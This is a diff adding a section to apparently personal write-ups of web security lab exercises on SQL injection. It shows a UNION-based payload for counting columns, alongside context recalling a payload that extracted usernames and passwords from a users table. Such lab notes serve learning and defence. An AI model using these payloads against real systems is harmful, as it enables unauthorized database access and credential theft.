@@ -55,3 +55,23 @@ UNION SELECT username, password FROM users--';
 **Explanation:**
 
 The UNION SELECT combines product results with data from the users table. This exposed the administrator credentials, which were used to log in.
+
+## Lab 4 – Determine the Number of Columns
+
+**Status:** Solved
+
+**Payload:**
+`Gifts' UNION SELECT NULL,NULL,NULL--`
+
+**SQL Query:**
+```sql
+SELECT * FROM products
+WHERE category = 'Gifts'
+UNION SELECT NULL, NULL, NULL--';
+```
+
+**Explanation:**
+
+ORDER BY 3 worked, but ORDER BY 4 caused an error.
+This confirmed that the query returns 3 columns.
+UNION SELECT with three NULL values worked because the number of columns matched.
